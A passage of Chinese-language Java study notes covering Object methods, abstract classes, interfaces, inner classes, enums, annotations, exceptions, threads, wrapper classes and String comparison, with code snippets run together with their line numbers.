②通常是建议重写，如果在eclipse中，可以用Alt +Shift + S–&gt;Generate toString() ③如果我们直接System.out.println(对象)，默认会自动调用这个对象的toString() （2）public final Class&lt;?&gt; getClass()：获取对象的运行时类型 （3）protected void finalize()：当对象被GC确定为要被回收的垃圾，在回收之前由GC帮你调用这个方法。而且这个方法只会被调用一次。子类可以选择重写。 （4）public int hashCode()：返回每个对象的hash值。 规定：①如果两个对象的hash值是不同的，那么这两个对象一定不相等； ​ ②如果两个对象的hash值是相同的，那么这两个对象不一定相等。 主要用于后面当对象存储到哈希表等容中时，为了提高性能用的。 （5）public boolean equals(Object obj)：用于判断当前对象this与指定对象obj是否“相等” ①默认情况下，equals方法的实现等价于与“==”，比较的是对象的地址值 ②我们可以选择重写，重写有些要求： A：如果重写equals，那么一定要一起重写hashCode()方法，因为规定： ​ a：如果两个对象调用equals返回true，那么要求这两个对象的hashCode值一定是相等的； ​ b：如果两个对象的hashCode值不同的，那么要求这个两个对象调用equals方法一定是false； ​ c：如果两个对象的hashCode值相同的，那么这个两个对象调用equals可能是true，也可能是false B：如果重写equals，那么一定要遵循如下几个原则： ​ a：自反性：x.equals(x)返回true ​ b：传递性：x.equals(y)为true, y.equals(z)为true，然后x.equals(z)也应该为true ​ c：一致性：只要参与equals比较的属性值没有修改，那么无论何时调用结果应该一致 ​ d：对称性：x.equals(y)与y.equals(x)结果应该一样 ​ e：非空对象与null的equals一定是false 7.8 关键字：abstract1、什么时候会用到抽象方法和抽象类？ 当声明父类的时候，在父类中某些方法的方法体的实现不能确定，只能由子类决定。但是父类中又要体现子类的共同的特征，即它要包含这个方法，为了统一管理各种子类的对象，即为了多态的应用。 那么此时，就可以选择把这样的方法声明为抽象方法。如果一个类包含了抽象方法，那么这个类就必须是个抽象类。 2、抽象类的语法格式 123456【权限修饰符】 abstract class 类名&#123; &#125;【权限修饰符】 abstract class 类名 extends 父类&#123; &#125; 3、抽象方法的语法格式 1【其他修饰符】 abstract 返回值类型 方法名(【形参列表】); 抽象方法没有方法体 4、抽象类的特点 （1）抽象类不能直接实例化，即不能直接new对象 （2）抽象类就是用来被继承的，那么子类继承了抽象类后，必须重写所有的抽象方法，否则这个子类也得是抽象类 （3）抽象类也有构造器，这个构造的作用不是创建抽象类自己的对象用的，给子类在实例化过程中调用； （4）抽象类也可以没有抽象方法，那么目的是不让你创建对象，让你创建它子类的对象 （5）抽象类的变量与它子类的对象也构成多态引用 5、不能和abstract一起使用的修饰符？ （1）final：和final不能一起修饰方法和类 （2）static：和static不能一起修饰方法 （3）native：和native不能一起修饰方法 （4）private：和private不能一起修饰方法 7.9 接口1、接口的概念 接口是一种标准。注意关注行为标准（即方法）。 面向对象的开发原则中有一条：面向接口编程。 2、接口的声明格式 123【修饰符】 interface 接口名&#123; 接口的成员列表;&#125; 3、类实现接口的格式 1234567【修饰符】 class 实现类 implements 父接口们&#123; &#125;【修饰符】 class 实现类 extends 父类 implements 父接口们&#123; &#125; 4、接口继承接口的格式 123【修饰符】 interface 接口名 extends 父接口们&#123; 接口的成员列表;&#125; 5、接口的特点 （1）接口不能直接实例化，即不能直接new对象 （2）只能创建接的实现类对象，那么接口与它的实现类对象之间可以构成多态引用。 （3）实现类在实现接口时，必须重写所有抽象的方法，否则这个实现类也得是抽象类。 （4）Java规定类与类之间，只能是单继承，但是Java的类与接口之间是多实现的关系，即一个类可以同时实现多个接口 （5）Java还支持接口与接口之间的多继承。 6、接口的成员 JDK1.8之前： （1）全局的静态的常量：public static final，这些修饰符可以省略 （2）公共的抽象方法：public abstract，这些修饰符也可以省略 JDK1.8之后： （3）公共的静态的方法：public static ,这个就不能省略了 （4）公共的默认的方法：public default，这个就不能省略了 7、默认方法冲突问题 （1） 当一个实现类同时实现了两个或多个接口，这个多个接口的默认方法的签名相同。 解决方案： 方案一：选择保留其中一个 1接口名.super.方法名(【实参列表】); 方案二：完全重写 （2）当一个实现类同时继承父类，又实现接口，父类中有一个方法与接口的默认方法签名相同 解决方案： 方案一：默认方案，保留父类的 方案二：选择保留接口的 1接口名.super.方法名(【实参列表】); 方案三：完全重写 8、示例代码 1234public interface Flyable&#123; long MAX_SPEED = 7900000; void fly();&#125; 12345public class Bird implements Flyable&#123; public void fly()&#123; //.... &#125;&#125; 9、常用的接口 （1）java.lang.Comparable接口：自然排序 ​ 抽象方法：int compareTo(Object obj) （2）java.util.Comparator接口：定制排序 ​ 抽象方法：int compare(Object obj1 ,Object obj2) （3）示例代码 如果员工类型，默认顺序，自然顺序是按照编号升序排列，那么就实现Comparable接口 123456789101112class Employee implements Comparable&#123; private int id; private String name; private double salary; //省略了构造器，get/set,toString @Override public int compareTo(Object obj)&#123; return id - ((Employee)obj).id; &#125;&#125; 如果在后面又发现有新的需求，想要按照薪资排序，那么只能选择用定制排序，实现Comparator接口 123456789101112class SalaryComparator implements Comparator&#123; public int compare(Object o1, Object o2)&#123; Employee e1 = (Employee)o1; Employee e2 = (Employee)o2; if(e1.getSalary() &gt; e2.getSalary())&#123; return 1; &#125;else if(e1.getSalary() &lt; e2.getSalary())&#123; return -1; &#125; return 0; &#125;&#125; 7.10 内部类1、内部类的概念 声明在另外一个类里面的类就是内部类。 2、内部类的4种形式 （1）静态内部类 （2）非静态成员内部类 （3）有名字的局部内部类 （4）匿名内部类 7.10.1 匿名内部类1、语法格式： 1234567891011121314//在匿名子类中调用父类的无参构造new 父类()&#123; 内部类的成员列表&#125;//在匿名子类中调用父类的有参构造new 父类(实参列表)&#123; 内部类的成员列表&#125;//接口没有构造器，那么这里表示匿名子类调用自己的无参构造，调用默认父类Object的无参构造new 父接口名()&#123; &#125; 2、匿名内部类、匿名对象的区别？ 1234567891011121314151617System.out.println(new Student(\"张三\"));//匿名对象Student stu = new Student(\"张三\");//这个对象有名字，stu//既有匿名内部类，又是一个匿名的对象new Object()&#123; public void test()&#123; ..... &#125;&#125;.test();//这个匿名内部类的对象，使用obj这个名字引用它，既对象有名字，但是这个Object的子类没有名字Object obj = new Object()&#123; public void test()&#123; ..... &#125;&#125;; 3、使用的形式 （1）示例代码：继承式 1234567891011121314abstract class Father&#123; public abstract void test();&#125;class Test&#123; public static void main(String[] args)&#123; //用父类与匿名内部类的对象构成多态引用 Father f = new Father()&#123; public void test()&#123; System.out.println(\"用匿名内部类继承了Father这个抽象类，重写了test抽象方法\") &#125; &#125;; f.test(); &#125;&#125; （2）示例代码：实现式 1234567891011121314interface Flyable&#123; void fly();&#125;class Test&#123; public static void main(String[] args)&#123; //用父接口与匿名内部类的对象构成了多态引用 Flyable f = new Flyable()&#123; public void fly()&#123; System.out.println(\"用匿名内部类实现了Flyable这个接口，重写了抽象方法\"); &#125; &#125;; f.fly(); &#125;&#125; （3）示例代码：用匿名内部类的匿名对象直接调用方法 12345new Object()&#123; public void test()&#123; System.out.println(\"用匿名内部类的匿名对象直接调用方法\") &#125;&#125;.test(); （4）示例代码：用匿名内部类的匿名对象直接作为实参 123456789101112131415Student[] all = new Student[3];all[0] = new Student(\"张三\",23);all[1] = new Student(\"李四\",22);all[2] = new Student(\"王五\",20);//用匿名内部类的匿名对象直接作为实参//这个匿名内部类实现了Comparator接口//这个匿名内部类的对象，是定制比较器的对象Arrays.sort(all, new Comparator()&#123; public int compare(Obeject o1, Object o2)&#123; Student s1 = (Student)o1; Student s2 = (Student)o2; return s1.getAge() - s2.getAge(); &#125;&#125;); 7.10.2 静态内部类1、语法格式 1234567【修饰符】 class 外部类名 【extends 外部类的父类】 【implements 外部类的父接口们】&#123; 【其他修饰符】 static class 静态内部类 【extends 静态内部类自己的父类】 【implements 静态内部类的父接口们】&#123; 静态内部类的成员列表; &#125; 外部类的其他成员列表;&#125; 2、 使用注意事项 （1）包含成员是否有要求： ​ 可以包含类的所有成员 （2）修饰符要求： ​ 权限修饰符：4种 ​ 其他修饰符：abstract、final （3）使用外部类的成员上是否有要求 ​ 只能使用外部类的静态成员 （4）在外部类中使用静态内部类是否有要求 ​ 正常使用 （5）在外部类的外面使用静态内部类是否有要求 1234567（1）如果使用的是静态内部类的静态成员 外部类名.静态内部类名.静态成员（2）如果使用的是静态内部类的非静态成员 ①先创建静态内部类的对象 外部类名.静态内部类名 对象名 = new 外部类名.静态内部类名(【实参列表】); ②通过对象调用非静态成员 对象名.xxx （6）字节码文件形式：外部类名$静态内部类名.class 3、示例代码 123456789101112131415161718192021222324252627282930class Outer&#123; private static int i = 10; static class Inner&#123; public void method()&#123; //... System.out.println(i);//可以 &#125; public static void test()&#123; //... System.out.println(i);//可以 &#125; &#125; public void outMethod()&#123; Inner in = new Inner(); in.method(); &#125; public static void outTest()&#123; Inner in = new Inner(); in.method(); &#125;&#125;class Test&#123; public static void main(String[] args)&#123; Outer.Inner.test(); Outer.Inner in = new Outer.Inner(); in.method(); &#125;&#125; 7.10.3 非静态内部类1、语法格式 1234567【修饰符】 class 外部类名 【extends 外部类的父类】 【implements 外部类的父接口们】&#123; 【修饰符】 class 非静态内部类 【extends 非静态内部类自己的父类】 【implements 非静态内部类的父接口们】&#123; 非静态内部类的成员列表; &#125; 外部类的其他成员列表;&#125; 2、 使用注意事项 （1）包含成员是否有要求： ​ 不允许出现静态的成员 （2）修饰符要求 ​ 权限修饰符：4种 ​ 其他修饰符：abstract，final （3）使用外部类的成员上是否有要求 ​ 都可以使用 （4）在外部类中使用非静态内部类是否有要求 ​ 在外部类的静态成员中不能使用非静态内部类 （5）在外部类的外面使用非静态内部类是否有要求 12345678910111213//使用非静态内部类的非静态成员//(1)创建外部类的对象外部类名 对象名1 = new 外部类名(【实参列表】);//(2)通过外部类的对象去创建或获取非静态内部类的对象//创建外部类名.非静态内部类名 对象名2 = 对象名1.new 非静态内部类名(【实参列表】);//获取外部类名.非静态内部类名 对象名2 = 对象名1.get非静态内部类对象的方法(【实参列表】);//（3）通过非静态内部类调用它的非静态成员对象名2.xxx （6）字节码文件形式：外部类名$非静态内部类名.class 3、示例代码 12345678910111213141516171819202122232425262728293031323334class Outer&#123; private static int i = 10; private int j = 20; class Inner&#123; public void method()&#123; //... System.out.println(i);//可以 System.out.println(j);//可以 &#125; &#125; public void outMethod()&#123; Inner in = new Inner(); in.method(); &#125; public static void outTest()&#123; // Inner in = new Inner();//不可以 &#125; public Inner getInner()&#123; return new Inner(); &#125;&#125;class Test&#123; public static void main(String[] args)&#123; Outer out = new Outer(); Outer.Inner in1 = out.new Inner(); //创建 in1.method(); Outer.Inner in2 = out.getInner(); //获取 in2.method(); &#125;&#125; 7.10.4 局部内部类1、语法格式 12345678【修饰符】 class 外部类名 【extends 外部类的父类】 【implements 外部类的父接口们】&#123; 【修饰符】 返回值类型 方法名(【形参列表】)&#123; 【修饰符】 class 局部内部类 【extends 局部内部类自己的父类】 【implements 局部内部类的父接口们】&#123; 局部内部类的成员列表; &#125; &#125; 外部类的其他成员列表;&#125; 2、 使用注意事项 （1）包含成员是否有要求 ​ 不允许出现静态的成员 （2）修饰符要求 ​ 权限修饰符：不能 ​ 其他修饰符：abstract、final （3）使用外部类的成员等上是否有要求 ​ ①使用外部类的静态成员：随便用 ​ ②使用外部类的非静态成员：能不能用要看所在的方法是否是静态的 ​ ③使用所在方法的局部变量：必须 final修饰的 （4）在外部类中使用局部内部类是否有要求 ​ 有作用域 （5）在外部类的外面使用局部内部类是否有要求 ​ 没法使用 （6）字节码文件形式：外部类名$编号局部内部类名.class 3、示例代码 123456789101112131415161718192021222324252627282930class Outer&#123; private static int i = 10; private int j = 20; public void outMethod()&#123; class Inner&#123; public void method()&#123; //... System.out.println(i);//可以 System.out.println(j);//可以 &#125; &#125; Inner in = new Inner(); in.method(); &#125; public static void outTest()&#123; final int k = 30; class Inner&#123; public void method()&#123; //... System.out.println(i);//可以 System.out.println(j);//不可以 System.out.println(k);//可以 &#125; &#125; Inner in = new Inner(); in.method(); &#125;&#125; 第八章 枚举与注解8.1 枚举1、枚举（JDK1.5引入的） 枚举类型的对象是有限、固定的几个常量对象。 2、语法格式 1234567891011//形式一：枚举类型中只有常量对象列表【修饰符】 enum 枚举类型名&#123; 常量对象列表&#125;//形式二：枚举类型中只有常量对象列表【修饰符】 enum 枚举类型名&#123; 常量对象列表; 其他成员列表；&#125; 说明：常量对象列表必须在枚举类型的首行 回忆：首行 （1）super()或super(实参列表)：必须在子类构造器的首行 （2）this()或this(实参列表)：必须在本类构造器的首行 （3）package 包; 声明包的语句必须在源文件.java的代码首行 （4）枚举常量对象列表必须在枚举类型的首行 3、在其他类中如何获取枚举的常量对象 12345678//获取一个常量对象枚举类型名.常量对象名//获取一个常量对象枚举类型名.valueOf(\"常量对象名\") //获取所有常量对象枚举类型名[] all = 枚举类型名.values(); 4、枚举类型的特点 （1）枚举类型有一个公共的基本的父类，是java.lang.Enum类型，所以不能再继承别的类型 （2）枚举类型的构造器必须是私有的 （3）枚举类型可以实现接口 12345678910111213141516171819202122interface MyRunnable&#123; void run();&#125;enum Gender implements MyRunnable&#123; NAN,NV; public void run()&#123; //... &#125;&#125;//或enum Gender implements MyRunnable&#123; NAN&#123; public void run()&#123; //... &#125; &#125;,NV&#123; public void run()&#123; //... &#125; &#125;; &#125; 5、父类java.lang.Enum类型 （1）构造器 protected Enum(String name, int ordinal)：由编译器自动调用 （2）String name()：常量对象名 （3）int ordinal()：返回常量对象的序号，第一个的序号是0 （4）String toString()：返回常量对象名，如果子类想重写，需要手动 （5）int compareTo(Object obj)：按照常量对象的顺序比较 8.2 注解1、注解 它是代码级别的注释 2、标记符号：@ 3、系统预定义的三个最基本的注解： （1）@Override：表示某个方法是重写的方法 它只能用在方法上面，会让编译器对这个方法进行格式检查，是否满足重写的要求 （2）@SuppressWarnings(xx)：抑制警告 （3）@Deprecated：表示xx已过时 4、和文档注释相关的注解 （1）文档注释 123/**文档注释*/ （2）常见的文档注释 @author：作者 @since：从xx版本加入的 @see：另请参考 @param：形参 @return：返回值 @throws或@exception：异常 5、JUnit相关的几个注解 （1）@Test：表示它是一个单元测试方法 这个方法需要是：public void xxx(){} （2）@Before：表示在每一个单元测试方法之前执行 这个方法需要是：public void xxx(){} （3）@After：表示在每一个单元测试方法之后执行 这个方法需要是：public void xxx(){} （4）@BeforeClass：表示在类初始化阶段执行，而且只执行一次 这个方法需要是：public static void xxx(){} （3）@AfterClass：表示在类的“卸载”阶段执行，而且只执行一次 这个方法需要是：public static void xxx(){} 6、元注解 （1）@Target(xx)：用它标记的注解能够用在xx位置 (xx)：由ElementType枚举类型的10个常量对象指定，例如：TYPE，METHOD，FIELD等 例如： 123@Target(ElementType.TYPE)@Target(&#123;ElementType.TYPE,ElementType.METHOD,ElementType.FIELD&#125;) 1234import static java.lang.annotation.ElementType.*;@Target(&#123;TYPE,METHOD,FIELD&#125;) （2）@Retention（xx）：用它标记的注解可以滞留到xx阶段 (xx)：由RetentionPolicy枚举类型的3个常量对象指定，分别是：SOURCE，CLASS，RUNTIME 唯有RUNTIME阶段的注解才能被反射读取到 例如： 1@Retention(RetentionPolicy.RUNTIME) （3）@Documentd：用它标记的注解可以读取到API中 （4）@Inherited：用它标记的注解可以被子类继承 7、自定义注解 123456789@元注解【修饰符】 @interface 注解名&#123; &#125;@元注解【修饰符】 @interface 注解名&#123; 配置参数列表&#125; 配置参数的语法格式： 12345数据类型 配置参数名();或数据类型 配置参数名() default 默认值; 关于配置参数： （1）配置参数的类型有要求： 八种基本数据类型、String、枚举、Class类型、注解、它们的数组。 （2）如果自定义注解声明了配置参数，那么在使用这个注解时必须为配置参数赋值，除非它有默认值 1234@自定义注解名(配置参数名1=值，配置参数名2=值。。。)//如果配置参数类型是数组，那么赋值时，可以用&#123;&#125;表示数组@自定义注解名(配置参数名1=&#123;值&#125;，配置参数名2=值。。。) （3）如果配置参数只有一个，并且名称是value，那么赋值时可以省略value= （4）如果读取这个注解时，要获取配置参数的值的话，可以当成方法一样来访问 1自定义注解对象.配置参数(); 第九章 异常9.1 异常的类型的体系结构1、异常系列的超父类：java.lang.Throwable （1）只有它或它子类的对象，才能被JVM或throw语句“抛”出 （2）也只有它或它子类的对象，才能被catch“捕获” 2、Throwable分为两大派别 （1）Error：严重的错误，需要停下来重新设计、升级解决这个问题 （2）Exception： 一般的异常，可以通过判断、检验进行避免，或者使用try…catch进行处理 3、Exception又分为两大类 （1）运行时异常： ​ 它是RuntimeException或它子类的对象。 ​ 这种类型的异常，编译器不会提醒你，要进行throws或try…catch进行处理，但是运行时可能导致崩溃。 （2）编译时异常： ​ 异常除了运行时异常以外的都是编译时异常。 ​ 这种类型的异常，编译器是强制要求你，throws或try…catch进行处理，否则编译不通过。 4、列出常见的异常类型 （1）运行时异常 RuntimeException、NullPointerException（空指针异常），ClassCastException（类型转换异常），ArithmeticException（算术异常），NubmerFormatException（数字格式化异常），IndexOutOfBoundsException（下标越界异常）（ArrayIndexOutOfBoundsException（数组下标越界异常）、StringIndexOutOfBoundsException（字符串下标越界异常））、InputMisMatchException（输入类型不匹配异常）。。。。 （2）编译时异常 FileNotFoundException（文件找不到异常）、IOException（输入输出异常）、SQLException（数据库sql语句执行异常）。。。 9.2 异常的处理1、在当前方法中处理：try…catch…finally 12345678910111213141516171819202122232425262728//形式一：try...catchtry&#123; 可能发生异常的代码&#125;catch(异常类型 异常名e)&#123; 处理异常的代码（一般都是打印异常的信息的语句）&#125;catch(异常类型 异常名e)&#123; 处理异常的代码（一般都是打印异常的信息的语句）&#125;。。。//形式二：try...finallytry&#123; 可能发生异常的代码&#125;finally&#123; 无论try中是否有异常，也不管是不是有return，都要执行的部分&#125;//形式三：try..catch..finallytry&#123; 可能发生异常的代码&#125;catch(异常类型 异常名e)&#123; 处理异常的代码（一般都是打印异常的信息的语句）&#125;catch(异常类型 异常名e)&#123; 处理异常的代码（一般都是打印异常的信息的语句）&#125;。。。finally&#123; 无论try中是否有异常，也不管catch是否可以捕获异常，也不管try和catch中是不是有return，都要执行的部分&#125; 执行特点： （1）如果try中的代码没有异常，那么try中的代码会正常执行，catch部分就不执行，finally中会执行 （2）如果try中的代码有异常，那么try中发生异常的代码的后面就不执行了，找对应的匹配的catch分支执行，finally中会执行 1559610439025 2、finally与return混合使用时 （1）如果finally中有return，一定从finally中的return返回。 此时try和catch中的return语句，执行了一半，执行了第一个动作。所以，finally中的return语句会覆盖刚刚的返回值 return 返回值; 语句有两个动作：（1）把返回值放到“操作数栈”中，等当前方法结束后，这个“操作数栈”中的值会返回给调用处（2）结束当前方法的执行 （2）如果finally中没有return，finally中的语句会执行，但是不影响最终的返回值 即try和catch中的return语句两步拆开来走，先把（1）把返回值放到“操作数栈”中，（2）然后走finally中的语句（3）再执行return后半个动作，结束当前方法 3、在当前方法中不处理异常，明确要抛给调用者处理，使用throws 语法格式： 123【修饰符】 返回值类型 方法名(【形参列表】) throws 异常列表&#123; &#125; 此时调用者，就知道需要处理哪些异常。 方法的重写的要求： （1）方法名：相同 （2）形参列表：相同 （3）返回值类型： ​ 基本数据类型和void：相同 ​ 引用数据类型：&lt;= （4）修饰符： ​ 权限修饰符：&gt;= ​ 其他修饰符：static，final，private不能被重写 （5）throws：&lt;= 方法的重载： （1）方法名：相同 （2）形参列表：必须不同 （3）返回值类型：无关 （4）修饰符：无关 （5）throws：无关 9.3 手动抛出异常：throw1234throw 异常对象;//例如：throw new AccountException(\"xxx\"); throw抛出来的异常对象，和JVM抛出来的异常对象一样，也要用try..catch处理或者throws。 如果是运行时异常，编译器不会强制要求你处理，如果是编译时异常，那么编译器会强制要求你处理。 9.4 自定义异常1、必须继承Throwable或它的子类 我们见到比较多的是继承RuntimeException和Exception. 如果你继承RuntimeException或它的子类，那么你自定义的这个异常就是运行时异常。编译器就不会提醒你处理。 如果你继承Exception，那么它属于编译时异常，编译器会强制你处理。 2、建议大家保留两个构造器 123456789//无参构造public 自定义异常名()&#123; &#125;//有参构造public 自定义异常名(String message)&#123; super(message);&#125; 3、自定义异常对象，必须手动抛出，用throw抛出 9.5 关于异常的几个方法（1）e.printStackTrace()：打印异常对象的详细信息，包括异常类型，message，堆栈跟踪信息。这个对于调试，或者日志跟踪是非常有用的 （2）e.getMessage()：只是获取异常的message信息 关于异常信息的打印： 用System.err打印和用e.printStackTrace()都是会标记红色的突出。 用System.out打印，当成普通信息打印。 这两个打印是两个独立的线程，顺序是不能精确控制的。 第十章 多线程10.1 相关的概念1、程序（Program） ​ 为了实现一个功能，完成一个任务而选择一种编程语言编写的一组指令的集合。 2、进程（Process） ​ 程序的一次运行。操作系统会给这个进程分配资源（内存）。 ​ 进程是操作系统分配资源的最小单位。 ​ 进程与进程之间的内存是独立，无法直接共享。 ​ 最早的DOS操作系统是单任务的，同一时间只能运行一个进程。后来现在的操作系统都是支持多任务的，可以同时运行多个进程。进程之间来回切换。成本比较高。 3、线程（Thread） ​ 线程是进程中的其中一条执行路径。一个进程中至少有一个线程，也可以有多个线程。有的时候也把线程称为轻量级的进程。 ​ 同一个进程的多个线程之间有些内存是可以共享的（方法区、堆），也有些内存是独立的（栈（包括虚拟机栈和本地方法栈）、程序计数器）。 ​ 线程之间的切换相对进程来说成本比较低。 4、并行： 多个处理器同时可以执行多条执行路径。 5、并发：多个任务同时执行，但是可能存在先后关系。 10.2 两种实现多线程的方式1、继承Thread类 步骤： （1）编写线程类，去继承Thread类 （2）重写public void run(){} （3）创建线程对象 （4）调用start() 12345678910111213141516171819202122232425262728class MyThread extends Thread &#123; public void run()&#123; //... &#125;&#125;class Test&#123; public static void main(String[] args)&#123; MyThread my = new MyThread(); my.start();//有名字的线程对象启动 new MyThread().start();//匿名线程对象启动 //匿名内部类的匿名对象启动 new Thread()&#123; public void run()&#123; //... &#125; &#125;.start(); //匿名内部类，但是通过父类的变量多态引用，启动线程 Thread t = new Thread()&#123; public void run()&#123; //... &#125; &#125;; t.start(); &#125;&#125; 2、实现Runnable接口 步骤： （1）编写线程类，实现Runnable接口 （2）重写public void run(){} （3）创建线程对象 （4）借助Thread类的对象启动线程 12345678910111213141516171819202122232425class MyRunnable implements Runnable&#123; public void run()&#123; //... &#125;&#125;class Test &#123; public static void main(String[] args)&#123; MyRunnable my = new MyRunnable(); Thread t1 = new Thread(my); Thread t2 = new Thread(my); t1.start(); t2.start(); //两个匿名对象 new Thread(new MyRunnable()).start(); //匿名内部类的匿名对象作为实参直接传给Thread的构造器 new Thread(new Runnable()&#123; public void run()&#123; //... &#125; &#125;).start(); &#125;&#125; 10.3 线程的生命周期 1559782705811 10.4 Thread的相关API1、构造器 Thread() Thread(String name) Thread(Runnable target) Thread(Runnable target, String name) 2、其他方法 （1）public void run() （2）public void start() （3）获取当前线程对象：Thread.currentThread() （4）获取当前线程的名称：getName() （5）设置或获取线程的优先级：set/getPriority() 优先级的范围：[1,10]，Thread类中有三个常量：MAX_PRIORITY(10)，MIN_PRIORITY(1)，NORM_PRIORITY(5) 优先级只是影响概率。 （6）线程休眠：Thread.sleep(毫秒) （7）打断线程：interrupt() （8）暂停当前线程：Thread.yield() （9）线程要加塞：join() xx.join()这句代码写在哪个线程体中，哪个线程被加塞，和其他线程无关。 （10）判断线程是否已启动但未终止：isAlive() 10.5 关键字：volatilevolatile：易变，不稳定，不一定什么时候会变 修饰：成员变量 作用：当多个线程同时去访问的某个成员变量时，而且是频繁的访问，再多次访问时，发现它的值没有修改，Java执行引擎就会对这个成员变量的值进行缓存。一旦缓存之后，这个时候如果有一个线程把这个成员变量的值修改了，Jav执行引擎还是从缓存中读取，导致这个值不是最新的。如果不希望Java执行引擎把这个成员变的值缓存起来，那么就可以在成员变量的前面加volatile，每次用到这个成员变量时，都是从主存中读取。 10.6 关键字：synchronized（同步）1、什么情况下会发生线程安全问题？ （1）多个线程 （2）共享数据 （3）多个线程的线程体中，多条语句再操作这个共享数据时 2、如何解决线程安全问题？同步锁 形式一：同步代码块 形式二：同步方法 3、同步代码块 123synchronized(锁对象)&#123; //一次任务代码，这其中的代码，在执行过程中，不希望其他线程插一脚&#125; 锁对象： （1）任意类型的对象 （2）确保使用共享数据的这几个线程，使用同一个锁对象 4、同步方法 123synchronized 【修饰符】 返回值类型 方法名(【形参列表】)throws 异常列表&#123; //同一时间，只能有一个线程能进来运行&#125; 锁对象： （1）非静态方法：this（谨慎） （2）静态方法：当前类的Class对象 10.7 线程通信1、为了解决“生产者与消费者问题”。 当一些线程负责往“数据缓冲区”放数据，另一个线程负责从“数据缓冲区”取数据。 问题1：生产者线程与消费者线程使用同一个数据缓冲区，就是共享数据，那么要考虑同步 问题2：当数据缓冲区满的时候，生产者线程需要wait()， 当消费者消费了数据后，需要notify或notifyAll ​ 当数据缓冲区空的时候，消费者线程需要wait()， 当生产者生产了数据后，需要notify或notifyAll 2、java.lang.Object类中声明了： （1）wait()：必须由“同步锁”对象调用 （2）notfiy()和notifyAll()：必须由“同步锁”对象调用 3、面试题：sleep()和wait的区别 （1）sleep()不释放锁，wait()释放锁 （2）sleep()在Thread类中声明的，wait()在Object类中声明 （3）sleep()是静态方法，是Thread.sleep() ​ wait()是非静态方法，必须由“同步锁”对象调用 （4）sleep()方法导致当前线程进入阻塞状态后，当时间到或interrupt()醒来 ​ wait()方法导致当前线程进入阻塞状态后，由notify或notifyAll() 4、哪些操作会释放锁？ （1）同步代码块或同步方法正常执行完一次自动释放锁 （2）同步代码块或同步方法遇到return等提前结束 （3）wait() 5、不释放锁 （1）sleep() （2）yield() （3）suspend() 第十一章 常用类11.1 包装类11.1.1 包装类当要使用只针对对象设计的API或新特性（例如泛型），那么基本数据类型的数据就需要用包装类来包装。 序号 基本数据类型 包装类 1 byte Byte 2 short Short 3 int Integer 4 long Long 5 float Float 6 double Double 7 char Character 8 boolean Boolean 9 void Void 11.1.2 装箱与拆箱JDK1.5之后，可以自动装箱与拆箱。 注意：只能与自己对应的类型之间才能实现自动装箱与拆箱。 12Integer i = 1;Double d = 1;//错误的，1是int类型 装箱：把基本数据类型转为包装类对象。 转为包装类的对象，是为了使用专门为对象设计的API和特性 拆箱：把包装类对象拆为基本数据类型。 转为基本数据类型，一般是因为需要运算，Java中的大多数运算符是为基本数据类型设计的。比较、算术等 总结：对象（引用数据类型）能用的运算符有哪些？ （1）instanceof （2）=：赋值运算符 （3）==和!=：用于比较地址，但是要求左右两边对象的类型一致或者是有父子类继承关系。 （4）对于字符串这一种特殊的对象，支持“+”，表示拼接。 11.1.3 包装类的一些API1、基本数据类型和字符串之间的转换 （1）把基本数据类型转为字符串 123456int a = 10;//String str = a;//错误的//方式一：String str = a + \"\";//方式二：String str = String.valueOf(a); （2）把字符串转为基本数据类型 123int a = Integer.parseInt(\"整数的字符串\");double a = Double.parseDouble(\"小数的字符串\");boolean b = Boolean.parseBoolean(\"true或false\"); 2、数据类型的最大最小值 123Integer.MAX_VALUE和Integer.MIN_VALUELong.MAX_VALUE和Long.MIN_VALUEDouble.MAX_VALUE和Double.MIN_VALUE 3、转大小写 12Character.toUpperCase('x');Character.toLowerCase('X'); 4、转进制 123Integer.toBinaryString(int i) Integer.toHexString(int i)Integer.toOctalString(int i) 11.1.4 包装类对象的缓存问题 包装类 缓存对象 Byte -128~127 Short -128~127 Integer -128~127 Long -128~127 Float 没有 Double 没有 Character 0~127 Boolean true和false 12345678910111213141516171819Integer i = 1;Integer j = 1;System.out.println(i == j);//trueInteger i = 128;Integer j = 128;System.out.println(i == j);//falseInteger i = new Integer(1);//新new的在堆中Integer j = 1;//这个用的是缓冲的常量对象，在方法区System.out.println(i == j);//falseInteger i = new Integer(1);//新new的在堆中Integer j = new Integer(1);//另一个新new的在堆中System.out.println(i == j);//falseInteger i = new Integer(1);int j = 1;System.out.println(i == j);//true，凡是和基本数据类型比较，都会先拆箱，按照基本数据类型的规则比较 11.2 字符串11.2.1 字符串的特点1、字符串String类型本身是final声明的，意味着我们不能继承String。 2、字符串的对象也是不可变对象，意味着一旦进行修改，就会产生新对象 我们修改了字符串后，如果想要获得新的内容，必须重新接受。 如果程序中涉及到大量的字符串的修改操作，那么此时的时空消耗比较高。可能需要考虑使用StringBuilder或StringBuffer。 3、String对象内部是用字符数组进行保存的 JDK1.9之前有一个char[] value数组，JDK1.9之后byte[]数组 4、String类中这个char[] values数组也是final修饰的，意味着这个数组不可变，然后它是private修饰，外部不能直接操作它，String类型提供的所有的方法都是用新对象来表示修改后内容的，所以保证了String对象的不可变。 5、就因为字符串对象设计为不可变，那么所以字符串有常量池来保存很多常量对象 常量池在方法区。 如果细致的划分： （1）JDK1.6及其之前：方法区 （2）JDK1.7：堆 （3）JDK1.8：元空间 11.2.2 字符串对象的比较1、==：比较是对象的地址 只有两个字符串变量都是指向字符串的常量对象时，才会返回true 123String str1 = \"hello\";String str2 = \"hello\";str1 == str2//true 2、equals：比较是对象的内容，因为String类型重写equals，区分大小写 只要两个字符串的字符内容相同，就会返回true 123String str1 = new String(\"hello\");String str2 = new String(\"hello\");str1.equals(strs) //true 3、equalsIgnoreCase：比较的是对象的内容，不区分大小写 123String str1 = new String(\"hello\");String str2 = new String(\"HELLO\");str1.equalsIgnoreCase(strs) //true 4、compareTo：String类型重写了Comparable接口的抽象方法，自然排序，按照字符的Unicode编码值进行比较大小的，严格区分大小写 123String str1 = \"hello\";String str2 = \"world\";str1.compareTo(str2) //小于0的值 5、compareToIgnoreCase：不区分大小写，其他按照字符的Unicode编码值进行比较大小 123String str1 = new String(\"hello\");String str2 = new String(\"HELLO\");str1.compareToIgnoreCase(str2) //等于0 11.2.3 空字符的比较1、哪些是空字符串 123String str1 = \"\";String str2 = new String();String str3 = new String(\"\"); 空字符串：长度为0 2、如何判断某个字符串是否是空字符串 1234567if(\"\".equals(str))if(str!=null &amp;&amp; str.isEmpty())if(str!=null &amp;&amp; str.equals(\"\"))if(str!=null &amp;&amp; str.length()==0) 11.2.4 字符串的对象的个数1、字符串常量对象 1String 